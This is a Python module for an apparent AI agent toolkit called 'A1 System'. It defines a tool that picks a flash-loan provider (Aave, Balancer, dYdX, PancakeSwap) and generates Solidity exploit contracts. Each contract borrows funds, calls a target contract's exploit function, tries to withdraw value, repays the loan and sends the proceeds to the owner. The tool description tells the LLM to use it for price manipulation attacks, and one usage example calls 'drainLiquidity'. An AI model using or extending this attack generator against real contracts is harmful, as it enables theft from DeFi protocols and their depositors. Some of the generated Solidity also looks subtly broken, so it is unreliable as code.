"""
Flash Loan Tool for A1 System
Provides integration with major flash loan providers: Aave, Balancer, dYdX
"""

from typing import Dict, Any, List, Optional, Tuple
import logging
from dataclasses import dataclass
from .base import BaseTool, ToolResult, ToolParameter
import json


@dataclass
class FlashLoanProvider:
    """Flash loan provider configuration"""
    name: str
    address: str
    chain_id: int
    max_amount: Dict[str, int]  # token -> max amount
    fee_percentage: float
    supported_tokens: List[str]


@dataclass
class FlashLoanParams:
    """Parameters for flash loan execution"""
    provider: str
    token: str
    amount: int
    target_contract: str
    exploit_data: bytes
    chain_id: int = 1


class FlashLoanTool(BaseTool):
    """
    Tool for generating and executing flash loan based exploits
    Supports Aave V2/V3, Balancer Vault, and dYdX protocols
    """
    
    # Flash loan provider configurations
    PROVIDERS = {
        1: {  # Ethereum Mainnet
            "aave_v3": FlashLoanProvider(
                name="Aave V3",
                address="0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2",
                chain_id=1,
                max_amount={
                    "WETH": 10**6 * 10**18,  # 1M ETH
                    "USDC": 10**9 * 10**6,   # 1B USDC  
                    "USDT": 10**9 * 10**6,   # 1B USDT
                    "DAI": 10**9 * 10**18,   # 1B DAI
                    "WBTC": 10**4 * 10**8,   # 10k BTC
                },
                fee_percentage=0.0009,  # 0.09%
                supported_tokens=["WETH", "USDC", "USDT", "DAI", "WBTC", "LINK", "UNI"]
            ),
            "balancer": FlashLoanProvider(
                name="Balancer Vault",
                address="0xBA12222222228d8Ba445958a75a0704d566BF2C8",
                chain_id=1,
                max_amount={
                    "WETH": 10**6 * 10**18,
                    "USDC": 10**9 * 10**6,
                    "USDT": 10**9 * 10**6,
                    "DAI": 10**9 * 10**18,
                    "WBTC": 10**4 * 10**8,
                },
                fee_percentage=0.0,  # No fees
                supported_tokens=["WETH", "USDC", "USDT", "DAI", "WBTC", "BAL"]
            ),
            "dydx": FlashLoanProvider(
                name="dYdX Solo Margin",
                address="0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e",
                chain_id=1,
                max_amount={
                    "WETH": 10**5 * 10**18,   # 100k ETH
                    "USDC": 10**8 * 10**6,    # 100M USDC
                    "DAI": 10**8 * 10**18,    # 100M DAI
                },
                fee_percentage=0.0,  # No fees (but 2 wei deposit required)
                supported_tokens=["WETH", "USDC", "DAI"]
            )
        },
        56: {  # BSC
            "pancake": FlashLoanProvider(
                name="PancakeSwap V3",
                address="0x1b81D678ffb9C0263b24A97847620C99d213eB14", 
                chain_id=56,
                max_amount={
                    "WBNB": 10**5 * 10**18,
                    "USDT": 10**8 * 10**18,
                    "BUSD": 10**8 * 10**18,
                },
                fee_percentage=0.0005,  # 0.05%
                supported_tokens=["WBNB", "USDT", "BUSD", "CAKE"]
            )
        }
    }
    
    # Common token addresses
    TOKEN_ADDRESSES = {
        1: {
            "WETH": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            "USDC": "0xA0b86a33E6417c4b0000Ec37d8C3b4cB8fCb8D21",
            "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",
            "DAI": "0x6B175474E89094C44Da98b954EedeAC495271d0F",
            "WBTC": "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        },
        56: {
            "WBNB": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
            "USDT": "0x55d398326f99059fF775485246999027B3197955", 
            "BUSD": "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
        }
    }

    def __init__(self, config):
        super().__init__(config)
        self.logger = logging.getLogger(f"{__name__}.FlashLoanTool")

    async def execute(self, params: Dict[str, Any]) -> ToolResult:
        """
        Generate flash loan exploit code for given parameters
        
        Args:
            params: {
                'target_contract': str,
                'chain_id': int,
                'exploit_function': str, 
                'token_needed': str,
                'amount_needed': int,
                'expected_profit': int
            }
        """
        try:
            target_contract = params.get('target_contract')
            chain_id = params.get('chain_id', 1)
            exploit_function = params.get('exploit_function', 'exploit')
            token_needed = params.get('token_needed', 'WETH')
            amount_needed = params.get('amount_needed', 10**18)  # 1 token default
            
            if not target_contract:
                return ToolResult(
                    success=False,
                    data={},
                    error_message="target_contract is required"
                )
            
            # Find best flash loan provider
            provider_info = self._find_best_provider(chain_id, token_needed, amount_needed)
            if not provider_info:
                return ToolResult(
                    success=False,
                    data={},
                    error_message=f"No suitable flash loan provider found for {token_needed} on chain {chain_id}"
                )
            
            provider_name, provider = provider_info
            
            # Generate flash loan exploit contract
            exploit_code = self._generate_flash_loan_exploit(
                provider_name=provider_name,
                provider=provider,
                target_contract=target_contract,
                token_needed=token_needed,
                amount_needed=amount_needed,
                exploit_function=exploit_function,
                chain_id=chain_id
            )
            
            # Calculate profitability
            fee_amount = int(amount_needed * provider.fee_percentage)
            min_profit_needed = fee_amount + 10**15  # fees + 0.001 ETH gas
            
            return ToolResult(
                success=True,
                data={
                    'exploit_code': exploit_code,
                    'provider': provider_name,
                    'provider_address': provider.address,
                    'token': token_needed,
                    'amount': amount_needed,
                    'fee_amount': fee_amount,
                    'min_profit_needed': min_profit_needed,
                    'chain_id': chain_id,
                    'flash_loan_type': self._get_flash_loan_type(provider_name)
                },
                tool_name="flash_loan_tool"
            )
            
        except Exception as e:
            self.logger.error(f"Flash loan tool execution failed: {e}")
            return ToolResult(
                success=False,
                data={},
                error_message=str(e),
                tool_name="flash_loan_tool"
            )

    def _find_best_provider(self, chain_id: int, token: str, amount: int) -> Optional[Tuple[str, FlashLoanProvider]]:
        """Find the best flash loan provider for given requirements"""
        if chain_id not in self.PROVIDERS:
            return None
            
        providers = self.PROVIDERS[chain_id]
        best_provider = None
        best_score = -1
        
        for name, provider in providers.items():
            if token not in provider.supported_tokens:
                continue
                
            if token in provider.max_amount and amount > provider.max_amount[token]:
                continue
                
            # Score providers: lower fees = higher score, no fees = best
            score = 100 - (provider.fee_percentage * 10000)  # Convert to basis points
            if score > best_score:
                best_score = score
                best_provider = (name, provider)
                
        return best_provider

    def _get_flash_loan_type(self, provider_name: str) -> str:
        """Get the flash loan implementation type"""
        if "aave" in provider_name.lower():
            return "aave"
        elif "balancer" in provider_name.lower():
            return "balancer"
        elif "dydx" in provider_name.lower():
            return "dydx"
        elif "pancake" in provider_name.lower():
            return "pancake"
        else:
            return "generic"

    def _generate_flash_loan_exploit(self, provider_name: str, provider: FlashLoanProvider, 
                                   target_contract: str, token_needed: str, amount_needed: int,
                                   exploit_function: str, chain_id: int) -> str:
        """Generate flash loan exploit contract code"""
        
        token_address = self.TOKEN_ADDRESSES.get(chain_id, {}).get(token_needed, "0x0")
        flash_loan_type = self._get_flash_loan_type(provider_name)
        
        if flash_loan_type == "aave":
            return self._generate_aave_exploit(provider, target_contract, token_address, 
                                             amount_needed, exploit_function)
        elif flash_loan_type == "balancer":
            return self._generate_balancer_exploit(provider, target_contract, token_address,
                                                 amount_needed, exploit_function)
        elif flash_loan_type == "dydx":
            return self._generate_dydx_exploit(provider, target_contract, token_address,
                                             amount_needed, exploit_function)
        else:
            return self._generate_generic_exploit(provider, target_contract, token_address,
                                                amount_needed, exploit_function)

    def _generate_aave_exploit(self, provider: FlashLoanProvider, target_contract: str,
                             token_address: str, amount: int, exploit_function: str) -> str:
        """Generate Aave V3 flash loan exploit"""
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IFlashLoanSimpleReceiver}} from "@aave/core-v3/contracts/interfaces/IFlashLoanSimpleReceiver.sol";
import {{IPoolAddressesProvider}} from "@aave/core-v3/contracts/interfaces/IPoolAddressesProvider.sol";
import {{IPool}} from "@aave/core-v3/contracts/interfaces/IPool.sol";
import {{IERC20}} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITarget {{
    function {exploit_function}() external;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}}

contract AaveFlashLoanExploit is IFlashLoanSimpleReceiver {{
    IPoolAddressesProvider public constant ADDRESSES_PROVIDER = 
        IPoolAddressesProvider({provider.address});
    IPool public constant POOL = IPool(ADDRESSES_PROVIDER.getPool());
    
    address public constant TARGET = {target_contract};
    address public constant TOKEN = {token_address};
    uint256 public constant AMOUNT = {amount};
    
    address public owner;
    
    constructor() {{
        owner = msg.sender;
    }}
    
    function executeFlashLoan() external {{
        require(msg.sender == owner, "Only owner");
        
        bytes memory params = "";
        uint16 referralCode = 0;
        
        POOL.flashLoanSimple(
            address(this),
            TOKEN,
            AMOUNT,
            params,
            referralCode
        );
    }}
    
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external override returns (bool) {{
        require(msg.sender == address(POOL), "Only pool");
        require(initiator == address(this), "Only this contract");
        
        // Execute the exploit
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(address(this));
        
        // Transfer tokens to target if needed
        IERC20(TOKEN).transfer(TARGET, amount);
        
        // Execute exploit function
        ITarget(TARGET).{exploit_function}();
        
        // Try to extract value
        try ITarget(TARGET).withdraw() {{}} catch {{}}
        
        uint256 balanceAfter = IERC20(TOKEN).balanceOf(address(this));
        
        // Ensure we can repay the loan
        uint256 amountOwed = amount + premium;
        require(balanceAfter >= amountOwed, "Insufficient funds to repay");
        
        // Approve the repayment
        IERC20(TOKEN).approve(address(POOL), amountOwed);
        
        return true;
    }}
    
    function withdraw() external {{
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = IERC20(TOKEN).balanceOf(address(this));
        if (balance > 0) {{
            IERC20(TOKEN).transfer(owner, balance);
        }}
        
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {{
            payable(owner).transfer(ethBalance);
        }}
    }}
    
    receive() external payable {{}}
}}'''

    def _generate_balancer_exploit(self, provider: FlashLoanProvider, target_contract: str,
                                 token_address: str, amount: int, exploit_function: str) -> str:
        """Generate Balancer Vault flash loan exploit"""
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IFlashLoanRecipient}} from "@balancer-labs/v2-interfaces/contracts/vault/IFlashLoanRecipient.sol";
import {{IVault}} from "@balancer-labs/v2-interfaces/contracts/vault/IVault.sol";
import {{IERC20}} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITarget {{
    function {exploit_function}() external;
    function withdraw() external;
}}

contract BalancerFlashLoanExploit is IFlashLoanRecipient {{
    IVault public constant VAULT = IVault({provider.address});
    
    address public constant TARGET = {target_contract};
    address public constant TOKEN = {token_address};
    uint256 public constant AMOUNT = {amount};
    
    address public owner;
    
    constructor() {{
        owner = msg.sender;
    }}
    
    function executeFlashLoan() external {{
        require(msg.sender == owner, "Only owner");
        
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(TOKEN);
        
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = AMOUNT;
        
        bytes memory userData = "";
        
        VAULT.flashLoan(this, tokens, amounts, userData);
    }}
    
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {{
        require(msg.sender == address(VAULT), "Only vault");
        
        // Execute the exploit
        uint256 balanceBefore = tokens[0].balanceOf(address(this));
        
        // Transfer tokens to target if needed
        tokens[0].transfer(TARGET, amounts[0]);
        
        // Execute exploit function
        ITarget(TARGET).{exploit_function}();
        
        // Try to extract value
        try ITarget(TARGET).withdraw() {{}} catch {{}}
        
        uint256 balanceAfter = tokens[0].balanceOf(address(this));
        
        // Balancer flash loans are fee-free, just need to repay principal
        require(balanceAfter >= amounts[0], "Insufficient funds to repay");
        
        // Transfer back the borrowed amount (no fees)
        tokens[0].transfer(address(VAULT), amounts[0]);
    }}
    
    function withdraw() external {{
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = IERC20(TOKEN).balanceOf(address(this));
        if (balance > 0) {{
            IERC20(TOKEN).transfer(owner, balance);
        }}
        
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {{
            payable(owner).transfer(ethBalance);
        }}
    }}
    
    receive() external payable {{}}
}}'''

    def _generate_dydx_exploit(self, provider: FlashLoanProvider, target_contract: str,
                             token_address: str, amount: int, exploit_function: str) -> str:
        """Generate dYdX Solo Margin flash loan exploit"""
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IERC20}} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISoloMargin {{
    struct Info {{
        address owner;
        uint256 number;
    }}
    
    struct ActionArgs {{
        uint8 actionType;
        uint256 accountId;
        address otherAddress;
        uint256 otherAccountId;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        uint256 data;
    }}
    
    function operate(Info[] memory accounts, ActionArgs[] memory actions) external;
    function getNumMarkets() external view returns (uint256);
}}

interface ICallee {{
    function callFunction(
        address sender,
        Info memory account,
        bytes memory data
    ) external;
}}

interface ITarget {{
    function {exploit_function}() external;
    function withdraw() external;
}}

contract DyDxFlashLoanExploit is ICallee {{
    ISoloMargin public constant SOLO = ISoloMargin({provider.address});
    
    address public constant TARGET = {target_contract};
    address public constant TOKEN = {token_address};
    uint256 public constant AMOUNT = {amount};
    
    // dYdX market IDs (0 = WETH, 1 = SAI, 2 = USDC, 3 = DAI)
    uint256 public constant MARKET_ID = 0; // Assuming WETH
    
    address public owner;
    
    constructor() {{
        owner = msg.sender;
    }}
    
    function executeFlashLoan() external {{
        require(msg.sender == owner, "Only owner");
        
        ISoloMargin.Info[] memory infos = new ISoloMargin.Info[](1);
        infos[0] = ISoloMargin.Info({{owner: address(this), number: 1}});
        
        ISoloMargin.ActionArgs[] memory args = new ISoloMargin.ActionArgs[](3);
        
        // Withdraw
        args[0] = ISoloMargin.ActionArgs({{
            actionType: 1, // Withdraw
            accountId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            primaryMarketId: MARKET_ID,
            secondaryMarketId: 0,
            data: AMOUNT
        }});
        
        // Call
        args[1] = ISoloMargin.ActionArgs({{
            actionType: 2, // Call
            accountId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            primaryMarketId: 0,
            secondaryMarketId: 0,
            data: 0
        }});
        
        // Deposit
        args[2] = ISoloMargin.ActionArgs({{
            actionType: 0, // Deposit  
            accountId: 0,
            otherAddress: address(this),
            otherAccountId: 0,
            primaryMarketId: MARKET_ID,
            secondaryMarketId: 0,
            data: AMOUNT + 2 // Repay amount + 2 wei fee
        }});
        
        SOLO.operate(infos, args);
    }}
    
    function callFunction(
        address sender,
        ISoloMargin.Info memory account,
        bytes memory data
    ) external {{
        require(msg.sender == address(SOLO), "Only solo");
        require(sender == address(this), "Only this contract");
        
        // Execute the exploit
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(address(this));
        
        // Transfer tokens to target if needed
        IERC20(TOKEN).transfer(TARGET, AMOUNT);
        
        // Execute exploit function
        ITarget(TARGET).{exploit_function}();
        
        // Try to extract value
        try ITarget(TARGET).withdraw() {{}} catch {{}}
        
        uint256 balanceAfter = IERC20(TOKEN).balanceOf(address(this));
        
        // dYdX requires 2 wei fee
        require(balanceAfter >= AMOUNT + 2, "Insufficient funds to repay");
    }}
    
    function withdraw() external {{
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = IERC20(TOKEN).balanceOf(address(this));
        if (balance > 0) {{
            IERC20(TOKEN).transfer(owner, balance);
        }}
        
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {{
            payable(owner).transfer(ethBalance);
        }}
    }}
    
    receive() external payable {{}}
}}'''

    def _generate_generic_exploit(self, provider: FlashLoanProvider, target_contract: str,
                                token_address: str, amount: int, exploit_function: str) -> str:
        """Generate generic flash loan exploit template"""
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {{IERC20}} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanProvider {{
    function flashLoan(address recipient, address token, uint256 amount, bytes calldata data) external;
}}

interface ITarget {{
    function {exploit_function}() external;
    function withdraw() external;
}}

contract GenericFlashLoanExploit {{
    IFlashLoanProvider public constant PROVIDER = IFlashLoanProvider({provider.address});
    
    address public constant TARGET = {target_contract};
    address public constant TOKEN = {token_address};
    uint256 public constant AMOUNT = {amount};
    
    address public owner;
    
    constructor() {{
        owner = msg.sender;
    }}
    
    function executeFlashLoan() external {{
        require(msg.sender == owner, "Only owner");
        
        bytes memory data = "";
        PROVIDER.flashLoan(address(this), TOKEN, AMOUNT, data);
    }}
    
    function flashLoanCallback(
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external {{
        require(msg.sender == address(PROVIDER), "Only provider");
        
        // Execute the exploit
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(address(this));
        
        // Transfer tokens to target if needed
        IERC20(TOKEN).transfer(TARGET, amount);
        
        // Execute exploit function
        ITarget(TARGET).{exploit_function}();
        
        // Try to extract value
        try ITarget(TARGET).withdraw() {{}} catch {{}}
        
        uint256 balanceAfter = IERC20(TOKEN).balanceOf(address(this));
        
        // Ensure we can repay the loan + fees
        uint256 amountOwed = amount + fee;
        require(balanceAfter >= amountOwed, "Insufficient funds to repay");
        
        // Repay the loan
        IERC20(TOKEN).transfer(address(PROVIDER), amountOwed);
    }}
    
    function withdraw() external {{
        require(msg.sender == owner, "Only owner");
        
        uint256 balance = IERC20(TOKEN).balanceOf(address(this));
        if (balance > 0) {{
            IERC20(TOKEN).transfer(owner, balance);
        }}
        
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {{
            payable(owner).transfer(ethBalance);
        }}
    }}
    
    receive() external payable {{}}
}}'''

    def get_name(self) -> str:
        return "flash_loan_tool"

    def get_description(self) -> str:
        return "Generates flash loan exploit contracts for Aave, Balancer, dYdX, and other providers. Use when target contract requires large capital for exploitation or when implementing price manipulation attacks."
    
    def get_parameters(self) -> List[ToolParameter]:
        """Define parameters for tool calling"""
        return [
            ToolParameter(
                name="target_contract",
                type="string",
                description="Address of the target contract to exploit",
                required=True
            ),
            ToolParameter(
                name="chain_id",
                type="integer",
                description="Blockchain chain ID (1 for Ethereum, 56 for BSC)",
                default=1
            ),
            ToolParameter(
                name="exploit_function",
                type="string", 
                description="Name of the exploit function to call on target contract",
                default="exploit"
            ),
            ToolParameter(
                name="token_needed",
                type="string",
                description="Token symbol needed for the exploit (WETH, USDC, etc.)",
                default="WETH"
            ),
            ToolParameter(
                name="amount_needed",
                type="integer",
                description="Amount of tokens needed in wei (e.g., 1000000000000000000 for 1 ETH)",
                default=1000000000000000000
            ),
            ToolParameter(
                name="expected_profit",
                type="integer",
                description="Expected profit in wei to determine if flash loan is profitable",
                default=2000000000000000000
            )
        ]
    
    def get_usage_examples(self) -> List[Dict[str, Any]]:
        """Provide usage examples for the LLM"""
        return [
            {
                "target_contract": "0x1234567890123456789012345678901234567890",
                "chain_id": 1,
                "token_needed": "WETH",
                "amount_needed": 100000000000000000000,  # 100 ETH
                "expected_profit": 5000000000000000000   # 5 ETH profit
            },
            {
                "target_contract": "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
                "chain_id": 56,
                "token_needed": "WBNB", 
                "amount_needed": 50000000000000000000,   # 50 BNB
                "exploit_function": "drainLiquidity"
            }
        ]

    def get_supported_providers(self, chain_id: int) -> Dict[str, FlashLoanProvider]:
        """Get supported flash loan providers for a chain"""
        return self.PROVIDERS.get(chain_id, {})

    def calculate_max_profitable_amount(self, provider: FlashLoanProvider, 
                                      expected_profit_rate: float) -> int:
        """Calculate maximum profitable flash loan amount"""
        if provider.fee_percentage == 0:
            return max(provider.max_amount.values()) if provider.max_amount else 10**18
        
        # Amount where fee < expected profit
        # fee = amount * fee_percentage
        # profit = amount * expected_profit_rate
        # profitable when: profit > fee
        if expected_profit_rate <= provider.fee_percentage:
            return 0
            
        # Use a conservative 10% of max amount for profitable calculations
        max_amount = max(provider.max_amount.values()) if provider.max_amount else 10**18
        return min(max_amount, int(10**18 / provider.fee_percentage)) // 10